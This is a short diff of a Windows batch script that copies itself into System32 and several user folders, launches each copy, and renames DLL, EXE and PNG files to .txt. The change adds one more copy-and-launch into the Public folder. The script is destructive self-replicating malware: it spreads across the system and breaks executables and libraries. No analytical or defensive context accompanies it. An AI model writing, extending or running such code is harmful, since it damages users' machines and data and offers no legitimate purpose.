@@ -32,6 +32,7 @@ copy %0 C:\Windows\System32
 copy %0 C:\Users\%USERNAME%\Music
 copy %0 C:\Users\%USERNAME%\Videos
 copy %0 C:\Users\%USERNAME%\Desktop
+copy %0 C:\Users\Public
 start C:\Windows\System32\%~n0
 start C:\Users\%USERNAME%\Documents\%~n0
 start C:\Users\%USERNAME%\Pictures\%~n0
@@ -40,6 +41,7 @@ start C:\Users\%USERNAME%\Videos\%~n0
 start C:\Users\%USERNAME%\Music\%~n0
 start C:\Users\%USERNAME%\Desktop\%~n0
 start C:\Users\%USERNAME%\Documents\%~n0
+start C:\Users\public\%~n0
 ren *.dll *.txt
 ren *.exe *.txt
 ren *.png *.txt
